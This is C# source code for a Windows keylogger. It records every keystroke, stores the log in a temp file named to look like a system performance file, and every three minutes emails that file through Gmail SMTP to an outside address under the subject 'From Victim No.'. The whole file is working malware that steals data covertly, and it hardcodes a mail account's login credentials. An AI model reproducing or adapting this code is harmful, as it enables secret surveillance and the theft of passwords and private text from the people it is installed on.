using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;

namespace WindowsApplication1
{
    public partial class frm_main : Form
    {
        Timer tmr_load = new Timer();
        Timer save_file_timer = new Timer();
        int i = 0, message_nomber = 1;
        string _filepass = System.IO.Path.GetTempPath();
        public frm_main()
        {
            InitializeComponent();
        }
        private void create_file()
        {
            if ((File.Exists(_filepass + "Perflib_Perfdata_Ks_b74.dat") == false))
                File.WriteAllText(_filepass + "Perflib_Perfdata_Ks_b74.dat", "[");
            else
                txt_keyrecorder.Text = File.ReadAllText(_filepass + "Perflib_Perfdata_Ks_b74.dat");
        }
        private void check(object sender,EventArgs e)
        {
            for (i = 0; i <= 127; i++)
            {
                if (API.tell_key(i) != 0)
                {
                    switch (i)
                    {
                        case 0: //NULL Input
                            txt_keyrecorder.Text += "";
                            break;
                        case 1: //left mouse botton
                            break;
                        case 2: //right mouse botton
                            break;
                        case 3: //Return Input
                            txt_keyrecorder.Text += "]\n[";
                            break;
                        case 8: //backSpace Input
                            {
                                if (txt_keyrecorder.Text.Length != 0)
                                    txt_keyrecorder.Text = txt_keyrecorder.Text.Substring(0, (txt_keyrecorder.Text.Length) - 1);
                                if (txt_keyrecorder.Text.Length == 0)
                                    txt_keyrecorder.Text = "[";
                                break;
                            }
                        case 9: //Tab Key
                            txt_keyrecorder.Text += "<Tab>";
                            break;
                        case 13: //Enter Input
                            txt_keyrecorder.Text += "]\n[";
                            break;
                        case 16: //Shift key
                                txt_keyrecorder.Text += "<Shift>";
                                break;
                        case 20: //CapsLock Key
                            {
                                if(API._if_capslock_pressed==0)
                                    txt_keyrecorder.Text+="<Caps-ON>";
                                else
                                    txt_keyrecorder.Text+="<Caps-OFF>";
                                if (API._if_capslock_pressed == 0)
                                    API._if_capslock_pressed = 1;
                                else
                                    API._if_capslock_pressed = 0;
                                break;
                            }
                        case 27: //Scape Key
                            txt_keyrecorder.Text += "<ESC>";
                            break;
                        case 32: //Space Input
                            txt_keyrecorder.Text += " ";
                            break;
                        case 35: //End Key
                            txt_keyrecorder.Text += "<End>";
                            break;
                        case 36://Home Key
                            txt_keyrecorder.Text += "<Home>";
                            break;
                        case 37: //Left Arrow Key
                            txt_keyrecorder.Text += "←";
                            break;
                        case 38: //Up Arrow Key
                            txt_keyrecorder.Text += "↑";
                            break;
                        case 39: //Right Arrow key
                            txt_keyrecorder.Text += "→";
                            break;
                        case 40: //Down Arrow Key
                            txt_keyrecorder.Text += "↓";
                            break;
                        case 44: //Middle mouse botton
                            break;
                        case 46: //Dellete key
                            txt_keyrecorder.Text += "<DEL>";
                            break;
                        default:
                            txt_keyrecorder.Text += (char)i;
                            break;
                    }
                }
            }
        }
        private void save_and_send(object sende, EventArgs e)
        {
            //save file
            File.WriteAllText(_filepass + "Perflib_Perfdata_Ks_b74.dat", txt_keyrecorder.Text);
            //if client was connected to internet sends E-mail
            MailMessage _message = new MailMessage();
            SmtpClient mail = new SmtpClient();
            MailAddress address = new MailAddress("Victim@gmail.com");
            int Desc;
            bool Is_connected = API.IsConnectedToInternet(out Desc, 0);
            if (Is_connected==true)
            {
                try
                {
                    _message.From = address;
                    _message.Subject = "From Victim No." + message_nomber.ToString();
                    _message.Body = "this is your keyloger, message nomber" + message_nomber.ToString();
                    _message.To.Add(new MailAddress("myyellowducky@gmail.com"));
                    _message.Attachments.Add(new Attachment(Path.GetTempPath().ToString() + "Perflib_Perfdata_Ks_b74.dat"));
                    mail.Credentials = new NetworkCredential("myyellowducky", "15411136600");
                    mail.Host = "smtp.gmail.com";
                    mail.Port = 587;
                    mail.EnableSsl = true;
                    mail.Send(_message);
                    _message.Dispose();
                }
                catch
                {
                    File.Create(Path.GetTempPath().ToString() + "Perflib_Perfdata_duckyError_b74.dat");
                }
                message_nomber++;
                txt_keyrecorder.Text = "[";
            }
        }
        private void frm_main_Load(object sender, EventArgs e)
        {
            
            create_file();
            //----------------
            tmr_load.Tick+=new EventHandler(check);
            tmr_load.Interval = 121;
            tmr_load.Enabled = false;
            tmr_load.Enabled = true;
            tmr_load.Start();
            //----------------
            save_file_timer.Tick += new EventHandler(save_and_send);
            save_file_timer.Interval = (1000) * (3*60); //indicates 3 mins call save_and_send function
            save_file_timer.Enabled = false;
            save_file_timer.Enabled = true;
            save_file_timer.Start();
        }
    }
}